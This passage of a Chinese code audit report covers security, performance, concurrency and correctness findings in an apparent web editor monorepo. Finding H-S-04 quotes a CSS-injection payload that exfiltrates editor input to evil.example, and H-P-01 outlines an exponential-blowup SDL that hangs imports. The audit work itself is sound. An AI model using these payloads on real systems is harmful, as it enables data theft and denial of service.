**修复建议**: 在 HTTP 边界为 leaseDurationMs 设置部署级上限(如小于等于5 分钟,超出拒绝或截断);仓库内对 now 加 leaseDurationMs 做溢出钳制,并把 renewLease 包进事务,保证读回失败时回滚。

##### H-S-04 动画 style 值未校验直接拼入 CSS,可向编辑器文档注入任意规则

- **位置**: [`packages/runtime-browser/src/animationPreview.ts:45`](packages/runtime-browser/src/animationPreview.ts#L45)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: 注入点核心是 color(求值层 transform 经 coerceNumber 仅数值、不可注入;css-filter 的 fn/unit 有白名单)。但另有一路:svg-filter-attr track 的 filterId 经 normalizeId 仅 trim,被 animationEvaluation:235 原样拼入 `filter:url(#filterId)`,同样可逃逸。且编辑器 UI 的 coerceKeyframeValueInput:50 对 color 直接收原始字符串,无需手改文档即可触发。

**失败场景**: 动画文档 color keyframe 值设为 `red;} *{visibility:hidden} input[value^=a]{background:url(//evil.example/?x=)}` → 预览画布在编辑器 origin 注入任意 CSS:可隐藏/伪装编辑器 UI,并通过属性选择器把编辑器输入内容编码进外发请求(携带站点 cookie)。

**修复建议**: 拼接前对 color/transform/filter 做值域白名单(如 CSS.supports 单值探测或严格正则),拒绝含分号/花括号/引号的值;根本修复应在 @prodivix/animation 求值层约束样式值域。

**验证备注**: 读码确认:animationPreview.ts:45 `color:${style.color};` 值未转义(仅选择器经 escapeCssAttributeValue:53);codec:217-220 任意字符串 value 放行,validator 仅校验 target/规范性;evaluation:217-218 color 字符串原样入 frame;authoring:50 编辑器输入也原样收 color;Canvas:199 style 标签包 cssText。

#### 3.2.4 performance

##### H-P-01 `inputTypeSchema`/`outputTypeSchema` 无记忆化,约 700 字节 SDL 即可指数放大挂死导入

- **位置**: [`packages/data-graphql/src/dataGraphqlImporter.ts:289`](packages/data-graphql/src/dataGraphqlImporter.ts#L289)
- **类别**: performance ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-data-conn

**详情**: 小修正:output 触发例 query Q 取 t 的 a 当 a 为复合类型且无子选择时会被 validate 拒绝;可触发写法为取 __typename 或在 O0 加标量叶字段后取 t 的 x。input 路径 query Q 带变量 v 类型 T0 取 t(v) 不受影响,机制与量级(2 的 33 次方减1)准确;另 595-597 行 outputTypeSchema 被调用两次,非爆炸路径也加倍开销。

**失败场景**: 调用方导入一份约 33 个 input 类型(每个两个字段指向下一类型,共约 700 字节、远低于 maxSchemaBytes 2MB)的 SDL 加一个使用该类型变量的 operation,inputTypeSchema 递归分配约 86 亿个对象,进程同步卡死直至 OOM,导入无法完成也无法中断。

**修复建议**: 对每个具名类型做投影记忆化(Map name 到 DataJsonSchema202012),或在整次投影上设置全局节点计数预算(超出出 limitExceeded issue),而不是仅依赖 maxTypeDepth。

**验证备注**: 属实。第289行 visiting.has 加 290行 new Set(visiting).add 为单路径副本而非全局 memo;263/322行 maxTypeDepth=32 仅限深度。菱形链 Tk 含 a,b 指向 Tk+1 每层展开 2 的 k 次方,合计 2 的 33 次方减1约 8.6e9 冻结对象。565行对每个变量类型整体展开 inputTypeSchema;约 700B SDL 远低于 2MB maxSchemaBytes,validate 不限类型展开宽度。

---

### 3.3 Medium(83 条)

#### 3.3.1 architecture

##### M-A-01 AI 领域核心(LlmGateway 等)错置于跨域包 @prodivix/shared,领域包 @prodivix/ai 反向依赖

- **位置**: [`packages/shared/src/llm/gateway.ts:92`](packages/shared/src/llm/gateway.ts#L92)
- **类别**: architecture ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: sweep-architecture

**详情**: LlmGateway(gateway.ts:92,docstring 自述 Prodivix 内部 AI 调用链路的统一入口)、LlmToolRegistry(toolRegistry.ts:3)、LlmTraceStore/InMemoryLlmTraceStore(traceStore.ts:3,7)、LlmContextBuilder(contextBuilder.ts:3)、MockLlmProvider(mockProvider.ts:8)以及全部 AI 契约类型 LlmProvider/LlmTaskRequest/LlmStructuredOutput/LlmProviderError(types.ts)都位于 packages/shared/src/llm,并经 index.ts:2 export 对外导出。这些是 AI 领域的编排行为与核心契约,而非 genuinely cross-domain types and utilities。同时指定归属 @prodivix/ai(CLAUDE.md: AI provider abstractions and shared AI utilities)反向依赖 shared(package.json:15 @prodivix/shared workspace 协议)。

**失败场景**: 开发者要演进 LlmProvider 接口或新增 AI 编排能力,必须改动并发布 @prodivix/shared,所有 shared 消费方(ui/compiler 等传递图)被迫拉入整套 AI 域与 MockLlmProvider/InMemoryLlmTraceStore 实现,且 shared 的发版周期绑架 AI 契约演进;编辑器 AI 面板从 shared 而非 @prodivix/ai 引入网关,provider/settings/validation 在 ai、网关在 shared,AI 行为治理被劈成两条导入路径。后果:层级倒挂(domain 包依赖基础设施包获取自身抽象),持续违反 do not move domain ownership back here,后续 AI 功能会继续向 shared 堆积、侵蚀其跨域工具定位。

**修复建议**: 将 packages/shared/src/llm 整体迁入 @prodivix/ai(gateway/toolRegistry/traceStore/contextBuilder/mockProvider/types),shared 仅保留 safety/iconPolicy/PdxComponent 等真正跨域工具;去掉 @prodivix/ai 对 @prodivix/shared 主入口的依赖(如需仅引 ./safety 子路径);编辑器与 AI 调用方统一从 @prodivix/ai 引入 LlmGateway 等。若 LlmProvider 契约确需多域可见,应抽出到显式声明的 AI 契约包而非 shared。

#### 3.3.2 concurrency

##### M-CC-01 持久化管道回流的旧中间快照会覆写进行中的动画编辑(回滚竞态)

- **位置**: [`apps/web/src/editor/features/animation/useAnimationEditorState.ts:143`](apps/web/src/editor/features/animation/useAnimationEditorState.ts#L143)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-anim-conflict

**详情**: 原判断「dispatcher 未传 applyOptimistically 故 store 只在 drain 回流」不成立:实际经 dispatchWorkspaceCommand 同步乐观应用。覆写窗口仅为 E2 的 await store.enqueue(IndexedDB)到乐观应用之间的毫秒级间隙,而非一次 RTT;若 E2 已应用,E1 ack adopt 会走 analyzeWorkspaceThreeWay 同字段 value 冲突并打开修订冲突面板,workspace 不被覆写。回滚闪回与丢字仅在 E1 adopt 落入 E2 入队间隙加闪回中再键入 c 的复合交织下成立,且闪回会被 E2 乐观应用自愈。

**失败场景**: 用户快速键入 timeline 名称 a(S1)、b(S2)。Outbox 提交 S1 并 adopt,persistedAnimation=S1;因 current/committed=S2,effect 执行 setAnimation(S1),输入框闪回 a;在此窗口(到 S2 提交返回,即一次网络 RTT)内用户再键入 c,onChange 基于 S1 生成 ac,b 永久丢失。

**修复建议**: 在 scheduleAnimationPersistence 中维护一个 pendingSignatures 集合(调度时加入、链完成时移除),hydrate 时若命中则视为自身写入回显而非外部变更;或改用 documentEditSeq/revision 比较,仅接受 seq 更新的外部快照。

**验证备注**: 前提部分错误:enqueueWorkspaceOperationOutboxAndDispatch(workspaceVfsOutboxExecutor:56-67)无 applyOptimistically 时调 dispatchWorkspaceCommand 同步乐观入 store(workspaceSlice:351-373),非等 drain。但竞态真实:dispatch 在 await store.enqueue(IDB,:44)之后。

##### M-CC-02 graphOptions 瞬时为空或缺失时自动把 executeGraph 绑定改写为首个/空 graph

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/InspectorTriggerItem.tsx:124`](apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/InspectorTriggerItem.tsx#L124)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-a

**详情**: 缺陷真实但机制非索引重建瞬时竞态:graphOptions 由控制器(1035-1044行)从原子快照 docsById 经 selectWorkspaceNodeGraphDocumentResults 派生,不经 Semantic Index。真正触发路径是绑定 graph 在新修订中被删除/解码失败而脱离 options 时:82-92行 selectedGraphId 回退 graphOptions[0] 或空串,124-159行 effect 因 rawGraphId 不等于 selectedGraphId 调 updateTrigger 把回退值写回 canonical Workspace,违反具名跨域引用 fail-closed。

**失败场景**: trigger 已绑定有效 graph G2。Workspace Semantic Index 按 revision 重建期间 graphOptions 瞬变为空或暂不含 G2,selectedGraphId 变成空串或首个 graph G1,effect 触发 updateTrigger 把 graphId 改成空或 G1。G2 绑定被静默清空或指向错误 graph;options 恢复后因 graphId 已被覆盖而无法还原,违反具名跨域引用应 fail-closed 的契约。

**修复建议**: effect 不应把回退值写回;仅在用户主动选择时更新。若引用的 graph 缺失,应保留原 graphId 并展示 diagnostic(fail closed),而不是替换为 graphOptions[0] 或空串。

**验证备注**: 读 InspectorTriggerItem.tsx:82-92 确认 graphId 不在 options 时回退 graphOptions[0] 或空串;124-159 effect 在 rawGraphId 不等于 selectedGraphId 时无守卫写回。控制器 1409-1462 updateTrigger 经 updateSelectedNode 提交。

##### M-CC-03 startBlueprintProject 缺少在途启动互斥,重叠调用会破坏全局执行簿记

- **位置**: [`apps/web/src/editor/features/blueprint/editor/runner/blueprintProjectRunnerClient.ts:233`](apps/web/src/editor/features/blueprint/editor/runner/blueprintProjectRunnerClient.ts#L233)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-editor-rest

**详情**: Stop 的具体分支依点击时机而定:jobA 被 Chain A 自停后 activeJob 可能已为 undefined(走无 job 分支)或仍为 jobA(返回 already-terminal),两者都使运行中的 jobB 无法停止;其余描述(孤儿会话、预览 Data/console 失效)准确。

**失败场景**: Remote 提供商下进入 Run 模式,快照上传期间(start 的 await 窗口)用户提交一次编辑,workspace 快照身份变化触发 useBlueprintProjectRunner effect 重跑,新链路进入 startBlueprintProject 且两条链路都在途;新 job 先完成、旧 job 后完成时:会话坐标器与数据桥被绑回旧 job,可见预览的 Data 操作路由到已取消环境而失败、console/network trace 丢失,Stop 按钮对真正运行的预览失效,且下次 Retry 时旧预览 job 永不被取消而泄漏。

**修复建议**: 为启动路径加互斥:引入模块级 starting Promise,并发调用串行化(排队等待上一个启动完成后再评估 activeJob),或在检测到在途启动时直接抛错;同时保证 activate/deactivate 与 activeJob 赋值在同一同步段内原子完成。

**验证备注**: 读代码证实:守卫第188行查 activeJob,但赋值在第233行、await provider.start(217行)之后;remote start 经 remoteExecutionProvider 第967行 client.create 上传快照为长窗口,每次新建 environment(205行)无串行化(browser runner 有 executionTail 加 supersede)。

##### M-CC-04 过期 effect 链路的清理会取消后继链路刚启动的 job

- **位置**: [`apps/web/src/editor/features/blueprint/editor/runner/useBlueprintProjectRunner.ts:129`](apps/web/src/editor/features/blueprint/editor/runner/useBlueprintProjectRunner.ts#L129)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-editor-rest

**详情**: 根因:两链路在 activeJob 尚为 undefined 时并发进入 startBlueprintProject(L188 守卫失效),共享模块级 activeJob;过期链的全局 stop 取消的是当时 activeJob 而非自身 job。触发新 job 被杀需:旧链 A 的 provider.start 先 resolve,但在同一 microtask 批内新链 B 的 L233 activeJob=jobB 插入 A 赋值与 A 的 stop 读取(L289)之间。取消瞬间 B 通常尚未订阅,但 subscribe 重放全量历史,UI 仍转 cancelled 并清空 previewUrl,需手动 Retry。

**失败场景**: Run 模式下旧启动(慢速 remote 上传)在途时发生一次编辑/重试,新链路先完成启动(新 job 成为 activeJob 且 UI 已订阅),随后旧链路的 await 返回并检测到非 active,调用全局 stop,取消的是新 job,用户看到预览刚出现就变成 cancelled/停止态,需要手动 Retry 才能恢复。

**修复建议**: 过期清理只取消本链路启动的 job:将 stopBlueprintProject 增加 expectedJobId 参数(仅当 activeJob 等于本链路的 job 时才取消),或直接在过期分支调用 job.cancel 并跳过全局状态清理,避免误伤后继 job。

**验证备注**: 属实。hook L124 await startBlueprintProject 后,L128-131 在非 active 时调用全局 stopBlueprintProject;client L289 const job=activeJob、L297 cancel 的是模块级 activeJob 而非本链路 job。L188 if activeJob 守卫在两链路都于 activeJob=undefined 时并发进入时失效。

##### M-CC-05 Contract 草稿在任何 Workspace 快照刷新时被静默重置,丢失未保存编辑

- **位置**: [`apps/web/src/editor/features/component/components/ComponentContractEditor.tsx:68`](apps/web/src/editor/features/component/components/ComponentContractEditor.tsx#L68)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-code-issues

**详情**: 描述准确。补充:即使远端/Outbox 变更未触及该组件文档,只要 workspace 引用被替换,model 重建即产生新 contract 引用触发覆盖;adoptWorkspaceRemoteSnapshot 仅按 workspace.id 门控,无 dirty 保护,触发路径含后台 drain 自动恢复,不限于多标签页。

**失败场景**: 用户在 Component 页修改 Contract 草稿(如新增 prop,未保存);此时多标签页/远端提交被采纳,或早先挂起的 Outbox 操作后台落库,workspace 快照替换,model 重建,definition.contract 新引用,effect 触发,草稿被重置为保存前内容,用户输入无声丢失,Save 按钮因 dirty=false 变灰。

**修复建议**: 仅在 contract 内容真正变化时重置:比较 JSON.stringify 或文档 contentRev,且 dirty 时不覆盖草稿(改为标记 stale 并提示),或把 effect 依赖改为 definition.documentId 加 contentRev 而非对象引用。

**验证备注**: 链路全部亲读确认:ComponentContractEditor.tsx:67-69 无条件 setDraft(definition.contract),dirty(71-74)用 JSON.stringify 比较,重置后 dirty=false、Save(109)禁用,无 stale 保护。useWorkspaceComponentAuthoring.ts:66-70 useMemo 依赖 workspace 每次重建 model。

##### M-CC-06 refresh() 过期 read 响应写入已重置的终端仿真器并把 phase 复活为 open

- **位置**: [`apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts:145`](apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts#L145)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-execution

**详情**: refresh() 在 124-125 行捕获 executionId/terminalSessionId 后,于 137 行 await client.read。await 返回后直接执行 emulatorController.consume(result.records)(145 行)、cursorRef.current = result.nextCursor(158 行)与 setView phase open/closed(160-171 行),全程不重新校验会话身份是否仍然有效。而 434-456 行的 availability 重置 effect 会在 execution 结束/被替换时清空 refs、cursorRef=0、resetEmulator、setView(initialView),却没有中止在途 read(无 AbortController)。175-181 行的 catch 分支同样会把已重置的 view 改回 reconnecting。

**失败场景**: 终端挂在 job A 上轮询;job A 结束或被 job B 替换,重置 effect 清空 refs、emulator、view=idle;此时在途的 A 会话 read 解析返回,旧输出被 consume 进刚重置的 emulator,cursorRef 被旧 nextCursor 覆盖,phase 被设回 open。界面把已失效执行的输出显示为已连接;因 refs 为空,send 一律返回 false 并标记 input-pending,轮询因 refs 为空早退,幽灵 open 状态一直停留到用户手动 close/重开。

**修复建议**: 在 hook 内维护一个随重置 effect/open 递增的 session generation ref,refresh 入口捕获该值,每次 await(read/resume)后比较,不一致则丢弃响应;或为每个会话世代绑定 AbortController,重置时 abort 在途请求。resume()(105-109 行)按同一方式设防。

**验证备注**: 竞态真实可达。refresh 在124-125捕获 id、127置 busy、137 await read;await 后145 consume、158写 cursorRef、160-171用函数式 setView 无条件把 phase 置为 open/closed,全程不复查 executionIdRef。重置 effect(434-456)在 availability 变化时清空 refs/cursor、resetEmulator、setView(initialView)。

##### M-CC-07 open() 过期成功响应复活已被清空的重执行会话身份

- **位置**: [`apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts:216`](apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts#L216)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-execution

**详情**: A 到 B 替换子场景下,首次 open 在途时 executionIdRef 仍为 undefined,重置 effect(434-440)因 status===available 且非 executionIdRef 提前 return,并未清空;真正清空发生于 A 结束到 unavailable 子场景。但两者结果相同:过期 open 响应无条件写回旧身份,且无后续 effect 纠正,轮询与输入挂到旧执行 A。

**失败场景**: job A 运行中用户点连接;open 请求在途时用户再次 Run,A 被新执行 B 替换(或变为 unavailable),重置 effect 清空状态,open 响应到达,写回 A 的 terminalSessionId 与 access,phase=open,轮询 effect 因 phase open 重新启动。此后用户键入经 send 发送到已被替换的旧执行 A 的 PTY,界面把 A 的输出呈现为当前会话,而非 fail closed 或挂接到 B。

**修复建议**: open 入口捕获当前 availability.jobId 与会话 generation;await 返回后若与最新值不一致,立即关闭 opened 会话(如 client.close)并丢弃结果,不写回任何 ref、不修改 view。

**验证备注**: open()193-244在212 await client.open 后,216-224无条件写回 executionIdRef/accessRef 并 setView phase open,await 后无对当前 availability.jobId 的过期校验。重置 effect434-456 deps 为 availability,ref 写入不触发它,open 写回后不会再纠正。

##### M-CC-08 外部库连续操作基于过期 externalResourceValue 全量覆写,先做的修改丢失

- **位置**: [`apps/web/src/editor/features/resources/ExternalLibraryManager.tsx:243`](apps/web/src/editor/features/resources/ExternalLibraryManager.tsx#L243)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-resources

**详情**: 竞态窗口为第一次操作 await store.enqueue(IDB)至乐观 dispatchWorkspaceCommand 之间;第二次 addLibrary/changeMode/updateLibraryVersion 在该窗口内用同一渲染期 externalResourceValue 快照构造 replace /value 整值命令,静默覆盖前一条。且无需等待下一次变更:B 应用后 externalResourceValue 即变,589-646 行 effect 立即按文档重建 activeLibraries,A 当场消失。

**失败场景**: 在 external 页快速点两个内置库的添加(或快速改两个库的版本下拉):addLibrary(A) 与 addLibrary(B) 的 persist 均基于同一旧 config,B 的命令整值替换后 config 只含 B;随后任一 workspace 变更触发 bootstrap effect,库 A 从列表中消失,需重新添加。

**修复建议**: 持久化入口改为从 useEditorStore.getState() 现取最新 workspace 文档值再应用 updater,或将连续写入排队/合并为单次命令,保证每次整值替换都基于最新已提交状态。

**验证备注**: 读 ExternalLibraryManager.tsx:77-80 externalResourceValue 为 useMemo 渲染快照;452-463 addLibrary 展开该快照、243 行 updater 用快照。workspaceResourceDocument.ts:234 forwardOps=replace /value 整值替换;workspaceCommand.ts:46-62 envelope 无 revision。

##### M-CC-09 隔离投递会话无过期防护,切换文件后旧文件的下载链接/内联预览挂到新文件面板

- **位置**: [`apps/web/src/editor/features/resources/PublicResourcePage.tsx:315`](apps/web/src/editor/features/resources/PublicResourcePage.tsx#L315)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-resources

**详情**: 描述基本准确,补充:createBinaryAssetPublicDeliveryRequest(binaryAsset.ts 174-191)对 png/jpeg 恒返回 disposition inline、其余 mime 恒为 attachment,故图片到图片切换必现 inline 预览错图(非若为 inline),非图片文件互切则错下载;影响为同用户同 Workspace 内的内容错标,非跨用户泄露。

**失败场景**: 选中 confidential.png 点 Isolated download(网络往返数百毫秒),立即改选 public-banner.png:effect 清空状态后旧响应到达,banner 的面板显示 Isolated delivery ready 且下载链接实际下载 confidential.png;若为 inline 投递,banner 预览区渲染的是 confidential.png。

**修复建议**: 为投递请求绑定 selectedNode.id 与 AbortController(或自增 sequence),响应回调中校验当前选中文件与请求目标一致且未被取消后再 setAssetDelivery。

**验证备注**: handleCreateIsolatedDelivery(282-323)在 315 行 await 后无条件 setAssetDelivery(delivery),无 signal/序号/目标校验;editorApi 663-699 支持 options(RequestInit)却未传。199 行 effect 换文件时只清空状态并 abort materialization,投递请求不受管控,旧响应必回写。

##### M-CC-10 run() 的编译/资产准备流水线不可取消,Stop 与页面切换均无法阻止迟到的测试启动

- **位置**: [`apps/web/src/editor/features/testing/useProjectTestRunner.ts:73`](apps/web/src/editor/features/testing/useProjectTestRunner.ts#L73)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-settings-misc

**详情**: run() 先 await materializeWorkspaceBinaryAssets(未传 signal,该函数本身支持 signal),再同步编译并调用 startProjectTests。stop()(104-108 行)仅调用 executionSessionCoordinator.cancel(sessionId),只能取消已注册进 coordinator 的 job;而 job 要等编译完成后由 startProjectTests 注册。因此 compiling 阶段(ProjectTestingPage 的 activeStatuses 含 compiling,此时按钮已是 Stop)点 Stop 是空操作。且 run 没有 AbortController/卸载清理,materialize 完成后无条件执行 startProjectTests。

**失败场景**: 资产较多的 Workspace 点 Run 后处于 compiling(materialize 走网络需数秒),用户点 Stop 以为已停止,但 materialize 完成后仍会启动一次完整测试运行;或在 compiling 期间切换到另一项目的 Testing 页再点 Run,迟到的旧 run 先占用 projectTestExecutionClient 的全局 activeJob,新 run 抛 The previous Workspace Test must reach a terminal state 进入 blocked,用户看到与操作无关的错误。

**修复建议**: 为每次 run 创建 AbortController:signal 传入 materializeWorkspaceBinaryAssets,并在 startProjectTests 前检查 aborted;stop 同时 abort 该 controller;组件卸载/workspace 切换时 abort,避免用旧 snapshot 启动作业。

**验证备注**: 代码事实全部坐实:run()第73行 await materializeWorkspaceBinaryAssets 未传 signal(该函数签名 line17 支持 signal 并在46/61行转发);stop 仅调 coordinator.cancel,而 executionSession.ts 649-653 对未注册 session 返回 session-not-found 即空操作,session 仅在 startProjectTests line85 activate 后才存在。

##### M-CC-11 设置 ack 采纳未按 workspaceId 校验,跨工作区污染全局设置 store

- **位置**: [`apps/web/src/editor/workspaceSync/workspaceSettingsOutboxAdoption.ts:21`](apps/web/src/editor/workspaceSync/workspaceSettingsOutboxAdoption.ts#L21)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-sync-store

**详情**: 触发须经 WorkspaceOutboxEffects 的 drain 路径:SettingsEffects 直连采纳被 disposed 守卫(line 109),且 executeClaimed 返回结果前已删除 outbox 条目;仅当 drain 自身持有 A 条目(重试/claim 竞争/queued 重试)并在 HTTP 在途时切到 B,line 134 的无守卫采纳才把 A 的 delta 合并进承载 B 设置的 store。修复建议(按 result.mutation.workspaceId 或 result.baseSnapshot.id 与当前 workspace.id 比对)正确。

**失败场景**: 工作区 A 中把 language 改为 zh-CN(设置 commit 在途),立即切换到工作区 B(Editor 以 B 的 language=en hydrate),A 的 drain run 此时完成并采纳 ack,store 被合并成 zh-CN,SettingsEffects 把 zh-CN 作为 B 的设置写入 B 的 workspace settings 文档,完成跨工作区设置泄漏。

**修复建议**: 在函数开头按结果所属 workspace 守卫:acknowledged 用 result.mutation.workspaceId、already-applied 用 result.baseSnapshot.id,与 useEditorStore.getState().workspace?.id 比较,不一致则直接 return(与快照采纳路径保持一致)。

**验证备注**: 证实。adoption.ts:21 仅判非 currentWorkspace,27-36 行无条件 merge 加 hydrate;对照 slice.ts:331 applyWorkspaceMutation 校验 workspace.id 不等 mutation.workspaceId、snapshotAdoption.ts:16 校验 baseSnapshot.id、OutboxEffects:49 有 resumeBase.id 守卫,唯 134 行设置采纳无守卫。

##### M-CC-12 抢占路径 await 后重读 activeController,异常致新任务永久挂起

- **位置**: [`packages/runtime-browser/src/browserProjectTestRunner.ts:352`](packages/runtime-browser/src/browserProjectTestRunner.ts#L352)
- **类别**: concurrency ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: execute 抢占分支先判 activeController 且 isJobActive(activeController),然后 await runtimeHost.stopOwner(ownerId),再调用 activeController.finishCancelled。await 期间 A 的取消/超时回调会把 activeController 置 undefined(522/561 行)。恢复后重读到的 activeController 为 undefined,抛 TypeError;该异常发生在 try 之外,被 executionTail.catch 静默吞掉,B 的 markStarting 永不执行。

**失败场景**: A 处于 cancelling(延迟 finishCancelled 未执行)时 B 开始 execute:B 进入抢占分支 await stopOwner;期间 A 的 stopController 把 activeController 置 undefined 并结束 A;B 恢复后 activeController.finishCancelled 抛 TypeError,B 永远停在 queued,job.completion 不结算(无 timeoutMs 时上层等待挂起)。

**修复建议**: await 前取局部快照 const previous = activeController,await 后 if (previous 且 isJobActive(previous)) previous.finishCancelled,不重读共享变量。

**验证备注**: 确认。抢占分支 352 行 await stopOwner 后于 353 行重读共享 let activeController。A 被 cancel 转 cancelling(executionJob.ts:400,非终态故 isJobActive 真),其 execute 经 isJobRunnable 提前返回,finally(510)因 A 仍 active 不清空 activeController。B 入抢占分支 await 期间,A 的 stopController 清空。

##### M-CC-13 get/getByOwnerRequest 跨两个池连接读行与事件,并发 append 时误报 cursor 漂移

- **位置**: [`packages/runtime-remote-postgres/src/postgresExecutionRepository.ts:344`](packages/runtime-remote-postgres/src/postgresExecutionRepository.ts#L344)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-server

**详情**: 根因是两次读取为 READ COMMITTED 下两条独立语句/各自快照(未必不同连接,同连接每语句亦独立快照)、不在同一事务。经 control plane handleOwned 到 repository.get 的 get/events.read 轮询与 worker appendWorkerEvent 并发时,append 提交落在行读与事件读之间即误报 Stored remote event cursor drifted。建议行加事件单事务或单条 json_agg 聚合 SQL。

**失败场景**: worker 高频 appendWorkerEvent 期间客户端轮询 get(executionId):行读发生在 append 提交前(cursor=N),事件读在提交后(N+1 条),抛出 drifted/corrupt TypeError;调用方把健康执行误判为数据损坏,轮询随机失败且不可复现。

**修复建议**: 把行与事件读取放入同一事务(复用 withPostgresTransaction 或单 client BEGIN/COMMIT),或合并为单条 SQL(如按 execution_id 用 json_agg 聚合事件)以保证同一快照。

**验证备注**: get(337-344)/getByOwnerRequest(346-353)未用 withPostgresTransaction,先 pool.query 读行(latest_cursor)再 load 第二次 pool.query 读事件(92-97);READ COMMITTED 下两语句各自快照。load 119-120 强校验 events.length 不等于 latestCursor 抛 drifted。appendWorkerEvent(528-616)单事务先插事件后更新行。

#### 3.3.3 correctness

##### M-C-01 密钥轮换整批事务被固定 5 秒 databaseContext 包裹,AWS KMS 模式下会永久停滞

- **位置**: [`apps/backend/internal/modules/environment/key_rotation.go:68`](apps/backend/internal/modules/environment/key_rotation.go#L68)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-env-auth

**详情**: 缺陷属实但非确定性:key_rotation.go:68 的固定 5s ctx 确贯穿整批事务与每行 2 次远程 KMS 调用,默认 batch=64 时 128 次串行 KMS 往返在均延迟约 35-40ms 即超预算致整批回滚,且确定性队首选择使下一 tick 重选同批。但是否永久停滞取决于实际 KMS 延迟分布,且可通过调低 BACKEND_ENVIRONMENT_SECRET_ROTATION_BATCH_SIZE 规避;static-keyring 本地模式不受影响。影响为轮换活性/旧密钥退役受阻。

**失败场景**: AWS KMS 模式默认配置(batch=64),待轮换 secret materials 大于等于64 行、KMS RTT 约 40ms:每轮轮换在约 128 次网络调用处命中 5 秒 deadline,整批回滚,下一 tick 选中完全相同的行,密钥轮换永远无法完成,运维被迫无限期保留已泄露的旧密钥。

**修复建议**: 为轮换事务使用与 batch size 成正比的超时预算;或改为按行/小子批独立短事务提交;远程 KMS 调用不应共享数据库 5 秒 ctx。

**验证备注**: 读码确认:key_rotation.go:68 databaseContext 到 store.go:163 固定 5s,同一 ctx 贯穿 BeginTx、逐行 encrypt/rewrap(108/115)直至 Commit(150);kms.go:210 rewrapFrom 每行串行 Unwrap 加 Wrap 两次,aws_kms.go:154 operationContext 派生自该 ctx,config.go:243 默认 batch=64。

##### M-C-02 PutSnapshot 在持行锁事务内串行执行最多 256 次远程 KMS 加密,合法大快照必然失败

- **位置**: [`apps/backend/internal/modules/environment/store.go:220`](apps/backend/internal/modules/environment/store.go#L220)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-env-auth

**详情**: 机制属实,但「必然」略绝对:是否超时取决于单次 KMS Encrypt 延迟与 secret 数量(无硬性保证)。因 aws_kms.go:154 operationContext 由 5s databaseContext 派生,KMSOperationTimeout 再大也突破不了 5s 总预算;256 上限叠加 256 次串行 DB INSERT,满载快照几乎必超时。常数实际位于 store.go:19。仅 AWS KMS 模式触发,默认 static-keyring 为本地 AES-GCM 不受影响。

**失败场景**: 客户端 PUT 一个含 200 条 secret 的 environment 快照:AWS KMS 模式下 200 次串行 Encrypt(约 8s)超出 5 秒事务 ctx,回滚,客户端收到 422 Execution environment is invalid,任何重试同样失败,该规模的合法写入永远无法成功。

**修复建议**: 将 envelope 加密移出数据库事务(先在事务外完成全部加密,再单次短事务落库);或按绑定数量放大超时预算。

**验证备注**: 无法驳倒。store.go:164 databaseContext=WithTimeout 5s;PutSnapshot 183 BeginTx、193 FOR UPDATE 持行锁,218-228 事务内对每个 secret 串行 encrypt;kms.go:149 每次新生成 dataKey、167 WrapDataKey 无缓存批处理。AWS 模式 aws_kms.go:154 operationContext 由该 5s ctx 派生继承上限。

##### M-C-03 import.meta.url 与 file 协议 process.argv[1] 字符串比较在 Windows 上恒不相等

- **位置**: [`apps/cli/src/cli.ts:17`](apps/cli/src/cli.ts#L17)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: 第17行 if (import.meta.url === file 协议加 process.argv[1]) cli(process.argv)。Windows 下 process.argv[1] 是无反斜杠转义、无前导斜杠的路径(如 D 盘 Projects prodivix apps cli src cli.ts),拼接后为 file://D 盘反斜杠路径,而 import.meta.url 为 file:///D:/Projects(三斜杠、正斜杠),二者在 Windows 上永远不相等。该守卫是 dev 脚本 tsx src/cli 唯一的执行入口(bin 路径另有独立缺陷)。

**失败场景**: 在本仓库的 Windows 开发环境执行 pnpm dev:cli,tsx 加载 src/cli.ts 后守卫为 false,cli() 未被调用,进程以退出码 0 静默结束:无输出、无报错、无命令执行,开发者无法察觉。POSIX 下因路径恰为斜杠开头而侥幸工作。

**修复建议**: 改用 node:url 的 pathToFileURL(process.argv[1]).href === import.meta.url 进行规范化比较(可容忍平台分隔符与特殊字符),并为 dev 提供独立入口脚本。

